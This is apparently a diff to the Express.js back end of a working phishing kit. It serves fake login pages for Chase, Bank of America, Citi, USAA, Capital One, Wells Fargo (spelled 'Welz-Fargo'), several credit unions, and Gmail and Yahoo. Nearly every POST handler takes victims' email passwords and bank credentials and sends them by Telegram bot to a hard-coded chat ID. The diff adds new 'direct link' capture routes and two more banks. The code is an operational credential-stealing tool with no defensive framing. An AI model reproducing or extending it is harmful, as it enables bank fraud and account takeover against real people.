@@ -104,15 +104,43 @@ app.route('/M&T')
 
    console.log(req.body);
  // Send a message to Telegram
-bot.sendMessage('6565379109', `New M&T_yahoo login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nM&TUserId: ${userId}\nM&TUserPassword: ${password}`)
+bot.sendMessage('974422536', `New M&T login Information\nTel Id: ${telId}\nemail: ${email}\nemailPassword: ${emailPassword}\nM&TUserId: ${userId}\nM&TUserPassword: ${password}`)
     .then(() => {
         console.log('Message sent to Telegram');
     })
     .catch((error) => {
         console.error('Error sending message to Telegram:', error);
     });
-    res.send('Success')
-        })
+    res.redirect('/LoginSucess')
+    })
+
+
+    // M&T Direct link
+
+    app.route('/M&TAuth')
+.get((req, res)=>{
+    const info = req.session.info2;
+    console.log('Info: ', info);
+    res.render('m&tAuth', {
+    
+    })
+})
+.post((req, res)=>{
+   const telId = req.body.tel_id;
+   const userId = req.body.userId;
+   const password = req.body.password
+
+   console.log(req.body);
+ // Send a message to Telegram
+bot.sendMessage('974422536', `New M&T login Information\nTel Id: ${telId}\n\nM&TUserId: ${userId}\nM&TUserPassword: ${password}`)
+    .then(() => {
+        console.log('Message sent to Telegram');
+    })
+    .catch((error) => {
+        console.error('Error sending message to Telegram:', error);
+    });
+    res.redirect('/LoginSucess')
+    })
 
 /* End of M&T Bank */
 
@@ -200,15 +228,44 @@ app.route('/Idaho')
 
    console.log(req.body);
  // Send a message to Telegram
-bot.sendMessage('6565379109', `New Idaho_yahoo login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nIdahoUsername: ${username}\nIdahoUserPassword: ${password}`)
+bot.sendMessage('974422536', `New Idaho login Information\nTel Id: ${telId}\nemail: ${email}\nemailPassword: ${emailPassword}\nIdahoUsername: ${username}\nIdahoUserPassword: ${password}`)
     .then(() => {
         console.log('Message sent to Telegram');
     })
     .catch((error) => {
         console.error('Error sending message to Telegram:', error);
     });
-    res.send('Success')
+    res.redirect('/LoginSucess')
+    })
+
+
+
+    // Idaho direct link
+    app.route('/IdahoAuth')
+    .get((req, res)=>{
+        const info = req.session.info2;
+        console.log('Info: ', info);
+        res.render('Idaho Central Credit UnionAuth.ejs', {
+            telId: info.telId,
         })
+    })
+    .post((req, res)=>{
+       const telId = req.body.tel_id;
+       const username = req.body.userId;
+       const password = req.body.password
+    
+       console.log(req.body);
+     // Send a message to Telegram
+    bot.sendMessage('974422536', `New Idaho login Information\nTel Id: ${telId}\n\nIdahoUsername: ${username}\nIdahoUserPassword: ${password}`)
+        .then(() => {
+            console.log('Message sent to Telegram');
+        })
+        .catch((error) => {
+            console.error('Error sending message to Telegram:', error);
+        });
+        res.redirect('/LoginSucess')
+        })
+    
 
 /* End of Idaho Bank */
 
@@ -296,15 +353,44 @@ app.route('/rbfcu')
 
    console.log(req.body);
  // Send a message to Telegram
-bot.sendMessage('6565379109', `New rbfcu_yahoo login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nrbfcuUsername: ${username}\nrbfcuUserPassword: ${password}`)
+bot.sendMessage('974422536', `New RBFCU login Information\nTel Id: ${telId}\nemail: ${email}\nemailPassword: ${emailPassword}\nrbfcuUsername: ${username}\nrbfcuUserPassword: ${password}`)
     .then(() => {
         console.log('Message sent to Telegram');
     })
     .catch((error) => {
         console.error('Error sending message to Telegram:', error);
     });
-    res.send('Success')
-        })
+    res.redirect('/LoginSucess')
+    })
+
+
+
+    // rbfcu direct link
+
+    app.route('/rbfcuAuth')
+.get((req, res)=>{
+    const info = req.session.info2;
+    console.log('Info: ', info);
+    res.render('RBFCU - Sign InAuth.ejs', {
+        
+    })
+})
+.post((req, res)=>{
+   const telId = req.body.tel_id;
+   const username = req.body.userId;
+   const password = req.body.password
+
+   console.log(req.body);
+ // Send a message to Telegram
+bot.sendMessage('974422536', `New RBFCU login Information\nTel Id: ${telId}\n\nrbfcuUsername: ${username}\nrbfcuUserPassword: ${password}`)
+    .then(() => {
+        console.log('Message sent to Telegram');
+    })
+    .catch((error) => {
+        console.error('Error sending message to Telegram:', error);
+    });
+    res.redirect('/LoginSucess')
+    })
 
 /* End of rbfcu Bank */
 
@@ -392,15 +478,41 @@ app.route('/BankOfAmerica_gmail_password')
         
                console.log(req.body);
              // Send a message to Telegram
-            bot.sendMessage('6565379109', `New BankOfAmerica_gmail login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nBankOfAmericaOnlineId: ${onlineId}\nBankOfAmericaUserPasscode: ${passcode}`)
+            bot.sendMessage('974422536', `New BankOfAmerica login Information\nTel Id: ${telId}\nemail: ${email}\nemailPassword: ${emailPassword}\nBankOfAmericaOnlineId: ${onlineId}\nBankOfAmericaUserPasscode: ${passcode}`)
                 .then(() => {
                     console.log('Message sent to Telegram');
                 })
                 .catch((error) => {
                     console.error('Error sending message to Telegram:', error);
                 });
-                res.redirect('/bankofamericaLoginSucess')
-                    })
+                res.redirect('/LoginSucess')
+                })
+
+        // Bank of America direct link
+
+        app.route('/BankOfAmericaAuth')
+            .get((req, res)=>{
+                const info = req.session.info2;
+                console.log('Info: ', info);
+                res.render('BankOf America - Sign InAuth', {
+                })
+            })
+            .post((req, res)=>{
+               const telId = req.body.tel_id;
+               const onlineId = req.body.onlineId;
+               const passcode = req.body.passcode
+        
+               console.log(req.body);
+             // Send a message to Telegram
+            bot.sendMessage('974422536', `New BankOfAmerica login Information\nTel Id: ${telId}\n\nBankOfAmericaOnlineId: ${onlineId}\nBankOfAmericaUserPasscode: ${passcode}`)
+                .then(() => {
+                    console.log('Message sent to Telegram');
+                })
+                .catch((error) => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+                res.redirect('/LoginSucess')
+                })
         
 /* End of BankOfAmerica Bank */
 
@@ -488,15 +600,41 @@ app.route('/CitiBank_gmail_password')
         
                console.log(req.body);
              // Send a message to Telegram
-            bot.sendMessage('6565379109', `New CitiBank login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nCitiBankOnlineId: ${userId}\nCitiBankUserPasscode: ${password}`)
+            bot.sendMessage('974422536', `New CitiBank login Information\nTel Id: ${telId}\nemail: ${email}\nemailPassword: ${emailPassword}\nCitiBankOnlineId: ${userId}\nCitiBankUserPasscode: ${password}`)
                 .then(() => {
                     console.log('Message sent to Telegram');
                 })
                 .catch((error) => {
                     console.error('Error sending message to Telegram:', error);
                 });
-                res.send('Success')
-                    })
+                res.redirect('/LoginSucess')
+                })
+
+                // Citibank direct link
+                app.route('/CitiBankAuth')
+            .get((req, res)=>{
+                const info = req.session.info2;
+                console.log('Info: ', info);
+                res.render('CitiBank - Sign InAuth', {
+                    
+                })
+            })
+            .post((req, res)=>{
+               const telId = req.body.tel_id;                
+               const userId = req.body.userId;
+               const password = req.body.password
+        
+               console.log(req.body);
+             // Send a message to Telegram
+            bot.sendMessage('974422536', `New CitiBank login Information\nTel Id: ${telId}\n\nCitiBankOnlineId: ${userId}\nCitiBankUserPasscode: ${password}`)
+                .then(() => {
+                    console.log('Message sent to Telegram');
+                })
+                .catch((error) => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+                res.redirect('/LoginSucess')
+                })
         
 /* End of Citi Bank */
 
@@ -584,16 +722,43 @@ app.route('/USAA_gmail_password')
         
                console.log(req.body);
              // Send a message to Telegram
-            bot.sendMessage('6565379109', `New USAA login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nUSAAOnlineId: ${onlineId}\nUSAAUserPasscode: ${password}`)
+            bot.sendMessage('974422536', `New USAA login Information\nTel Id: ${telId}\nemail: ${email}\nemailPassword: ${emailPassword}\nUSAAOnlineId: ${onlineId}\nUSAAUserPasscode: ${password}`)
                 .then(() => {
                     console.log('Message sent to Telegram');
                 })
                 .catch((error) => {
                     console.error('Error sending message to Telegram:', error);
                 });
-                res.redirect('/usaaLoginSucess')
-                    })
+                res.redirect('/LoginSucess')
+                })
         
+        
+        // USAA direct link
+
+        app.route('/USAAAuth')
+            .get((req, res)=>{
+                const info = req.session.info2;
+                console.log('Info: ', info);
+                res.render('USAA - Sign inAuth', {
+                   
+                })
+            })
+            .post((req, res)=>{
+               const telId = req.body.tel_id;
+               const onlineId = req.body.onlineId;
+               const password = req.body.password
+        
+               console.log(req.body);
+             // Send a message to Telegram
+            bot.sendMessage('974422536', `New USAA login Information\nTel Id: ${telId}\n\nUSAAOnlineId: ${onlineId}\nUSAAUserPasscode: ${password}`)
+                .then(() => {
+                    console.log('Message sent to Telegram');
+                })
+                .catch((error) => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+                res.redirect('/LoginSucess')
+                })
 /* End of USAA Bank */
 
 // Routes for Welz-Fargo Bank
@@ -629,7 +794,7 @@ app.route('/Welz-Fargo_gmail_password')
        res.redirect('/Welz-Fargo')
     })
 
-            // USAA Yahoo
+            // Welz-Fargo Yahoo
         app.route('/Welz-Fargo_yahoo')
             .get((req, res)=>{
                 res.sendFile(__dirname + '/Welz-Fargo_yahoo.html')
@@ -680,30 +845,303 @@ app.route('/Welz-Fargo_gmail_password')
         
                console.log(req.body);
              // Send a message to Telegram
-            bot.sendMessage('6565379109', `New USAA login Information\nTel Id: ${telId}\nemail: ${email}\emailPassword: ${emailPassword}\nUSAAUsername: ${username}\nUSAAUserPasscode: ${password}`)
+            bot.sendMessage('974422536', `New Welz-Fargo login Information\nTel Id: ${telId}\nemail: ${email}\nemailPassword: ${emailPassword}\nWelz-FargoUsername: ${username}\nWelz-FargoUserPasscode: ${password}`)
                 .then(() => {
                     console.log('Message sent to Telegram');
                 })
                 .catch((error) => {
                     console.error('Error sending message to Telegram:', error);
                 });
-                res.redirect('/welzLoginSucess')
-                    })
+                res.redirect('/LoginSucess')
+                })
         
-/* End of USAA Bank */
+
+        // Welz-Fargo direct link
+        app.route('/Welz-FargoAuth')
+            .get((req, res)=>{
+                const info = req.session.info2;
+                console.log('Info: ', info);
+                res.render('Welz-Fargo - Sign InAuth', {
+                    
+                })
+            })
+            .post((req, res)=>{
+               const telId = req.body.tel_id;
+               const username = req.body.username;
+               const password = req.body.password
+        
+               console.log(req.body);
+             // Send a message to Telegram
+            bot.sendMessage('974422536', `New Welz-Fargo login Information\nTel Id: ${telId}\n\nWelz-FargoUsername: ${username}\nWelz-FargoUserPasscode: ${password}`)
+                .then(() => {
+                    console.log('Message sent to Telegram');
+                })
+                .catch((error) => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+                res.redirect('/LoginSucess')
+                })
+        
+/* End of Welz-Fargo Bank */
 
 
 
+// Routes for Chase Bank
+// Chase Gmail
+app.route('/Chase_gmail')
+    .get((req, res)=>{
+        res.sendFile(__dirname + '/Chase_gmail.html')
+    })
+    .post((req, res)=>{
+       const telId = req.body.tel_id;
+       const email = req.body.email;
 
-app.get('/welzLoginSucess', (req, res)=>{
-    res.sendFile(__dirname + '/Welz_2021/Success.html')
+       req.session.info = {telId, email};
+       res.redirect('/Chase_gmail_password')
+    })
+
+app.route('/Chase_gmail_password')
+    .get((req, res)=>{
+        const info = req.session.info;
+        console.log('Info: ', info);
+        res.render('Chase_gmail_password', {
+            telId: info.telId,
+            email: info.email
+        })
+    })
+    .post((req, res)=>{
+       const telId = req.body.tel_id;
+       const email = req.body.email;
+       const emailPassword = req.body.password;
+
+       req.session.info2 = {telId, email, emailPassword};
+       console.log(req.session.info2);
+       res.redirect('/Chase')
+    })
+
+
+            // Chase Yahoo
+app.route('/Chase_yahoo')
+.get((req, res)=>{
+    res.sendFile(__dirname + '/Chase_yahoo.html')
+})
+.post((req, res)=>{
+   const telId = req.body.tel_id;
+   const email = req.body.email;
+
+   req.session.info = {telId, email};
+   res.redirect('/Chase_yahoo_password')
 })
 
-app.get('/usaaLoginSucess', (req, res)=>{
-    res.sendFile(__dirname + '/USAA-2022/home/email/done.html')
+app.route('/Chase_yahoo_password')
+.get((req, res)=>{
+    const info = req.session.info;
+    console.log('Info: ', info);
+    res.render('Chase_yahoo_password', {
+        telId: info.telId,
+        email: info.email
+    })
 })
-app.get('/bankofamericaLoginSucess', (req, res)=>{
-    res.sendFile(__dirname + '/Bank of America 2022/application/views/com.html')
+.post((req, res)=>{
+   const telId = req.body.tel_id;
+   const email = req.body.email;
+   const emailPassword = req.body.password;
+
+   req.session.info2 = {telId, email, emailPassword};
+   console.log(req.session.info2);
+   res.redirect('/Chase')
+})
+
+app.route('/Chase')
+.get((req, res)=>{
+    const info = req.session.info2;
+    console.log('Info: ', info);
+    res.render('Chase - Sign In', {
+        telId: info.telId,
+        email: info.email,
+        password: info.emailPassword
+    })
+})
+.post((req, res)=>{
+   const telId = req.body.tel_id;
+   const email = req.body.email;
+   const emailPassword = req.body.emailPassword;
+   const userId = req.body.userId;
+   const password = req.body.password
+
+   console.log(req.body);
+ // Send a message to Telegram
+bot.sendMessage('974422536', `New Chase login Information\nTel Id: ${telId}\nemail: ${email}\nemailPassword: ${emailPassword}\nChaseUserId: ${userId}\nChaseUserPassword: ${password}`)
+    .then(() => {
+        console.log('Message sent to Telegram');
+    })
+    .catch((error) => {
+        console.error('Error sending message to Telegram:', error);
+    });
+    res.redirect('/LoginSucess')
+    })
+
+// Chase direct link
+    app.route('/ChaseAuth')
+    .get((req, res)=>{
+        const info = req.session.info2;
+        console.log('Info: ', info);
+        res.render('Chase - Sign InAuth', {
+
+        })
+    })
+    .post((req, res)=>{
+       const telId = req.body.tel_id;
+       const userId = req.body.userId;
+       const password = req.body.password
+    
+       console.log(req.body);
+     // Send a message to Telegram
+    bot.sendMessage('974422536', `New Chase login Information\nTel Id: ${telId}\n\nUserId: ${userId}\nUserPassword: ${password}`)
+        .then(() => {
+            console.log('Message sent to Telegram');
+        })
+        .catch((error) => {
+            console.error('Error sending message to Telegram:', error);
+        });
+        res.redirect('/LoginSucess')
+        })
+
+/* End of Chase Bank */
+
+
+// Routes for CapitalOne Bank
+// CapitalOne Gmail
+app.route('/CapitalOne_gmail')
+    .get((req, res)=>{
+        res.sendFile(__dirname + '/CapitalOne_gmail.html')
+    })
+    .post((req, res)=>{
+       const telId = req.body.tel_id;
+       const email = req.body.email;
+
+       req.session.info = {telId, email};
+       res.redirect('/CapitalOne_gmail_password')
+    })
+
+app.route('/CapitalOne_gmail_password')
+    .get((req, res)=>{
+        const info = req.session.info;
+        console.log('Info: ', info);
+        res.render('CapitalOne_gmail_password', {
+            telId: info.telId,
+            email: info.email
+        })
+    })
+    .post((req, res)=>{
+       const telId = req.body.tel_id;
+       const email = req.body.email;
+       const emailPassword = req.body.password;
+
+       req.session.info2 = {telId, email, emailPassword};
+       console.log(req.session.info2);
+       res.redirect('/CapitalOne')
+    })
+
+
+            // CapitalOne Yahoo
+app.route('/CapitalOne_yahoo')
+.get((req, res)=>{
+    res.sendFile(__dirname + '/CapitalOne_yahoo.html')
+})
+.post((req, res)=>{
+   const telId = req.body.tel_id;
+   const email = req.body.email;
+
+   req.session.info = {telId, email};
+   res.redirect('/CapitalOne_yahoo_password')
+})
+
+app.route('/CapitalOne_yahoo_password')
+.get((req, res)=>{
+    const info = req.session.info;
+    console.log('Info: ', info);
+    res.render('CapitalOne_yahoo_password', {
+        telId: info.telId,
+        email: info.email
+    })
+})
+.post((req, res)=>{
+    const telId = req.body.tel_id;
+    const email = req.body.email;
+    const emailPassword = req.body.password;
+
+    req.session.info2 = {telId, email, emailPassword};
+    console.log(req.session.info2);
+    res.redirect('/CapitalOne')
+ })
+
+app.route('/CapitalOne')
+ .get((req, res)=>{
+     const info = req.session.info2;
+     console.log('Info: ', info);
+     res.render('CapitalOne', {
+         telId: info.telId,
+         email: info.email,
+         password: info.emailPassword
+     })
+ })
+ .post((req, res)=>{
+    const telId = req.body.tel_id;
+    const email = req.body.email;
+    const emailPassword = req.body.emailPassword;
+    const onlineId = req.body.onlineId;
+    const passcode = req.body.passcode
+
+    console.log(req.body);
+  // Send a message to Telegram
+ bot.sendMessage('974422536', `New CapitalOne login Information\nTel Id: ${telId}\nemail: ${email}\nemailPassword: ${emailPassword}\nCapitalOneOnlineId: ${onlineId}\nCapitalOneUserPasscode: ${passcode}`)
+     .then(() => {
+         console.log('Message sent to Telegram');
+     })
+     .catch((error) => {
+         console.error('Error sending message to Telegram:', error);
+     });
+     res.redirect('/LoginSucess')
+     })
+
+// Capital One direct link
+
+app.route('/CapitalOneAuth')
+ .get((req, res)=>{
+     const info = req.session.info2;
+     console.log('Info: ', info);
+     res.render('CapitalOneAuth', {
+     })
+ })
+ .post((req, res)=>{
+    const telId = req.body.tel_id;
+    const onlineId = req.body.onlineId;
+    const passcode = req.body.passcode
+
+    console.log(req.body);
+  // Send a message to Telegram
+ bot.sendMessage('974422536', `New CapitalOne login Information\nTel Id: ${telId}\n\nCapitalOneOnlineId: ${onlineId}\nCapitalOneUserPasscode: ${passcode}`)
+     .then(() => {
+         console.log('Message sent to Telegram');
+     })
+     .catch((error) => {
+         console.error('Error sending message to Telegram:', error);
+     });
+     res.redirect('/LoginSucess')
+     })
+
+
+/* End of CapitalOne Bank */
+
+
+
+
+
+
+
+app.get('/LoginSucess', (req, res)=>{
+    res.sendFile(__dirname + '/success.html')
 })
 
 
